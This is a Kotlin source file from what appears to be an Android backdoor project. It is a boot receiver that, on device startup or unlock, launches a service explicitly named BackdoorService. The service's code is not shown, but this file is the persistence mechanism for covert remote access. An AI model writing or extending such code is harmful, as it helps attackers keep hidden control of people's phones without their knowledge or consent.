package com.usbdroid.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Boot Receiver - Starts backdoor service on device boot
 */
class BootReceiver : BroadcastReceiver() {
    
    private val TAG = "BootReceiver"
    
    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_USER_PRESENT -> {
                Log.d(TAG, "Boot completed, starting backdoor service")
                
                val serviceIntent = Intent(context, BackdoorService::class.java)
                context.startService(serviceIntent)
            }
        }
    }
}
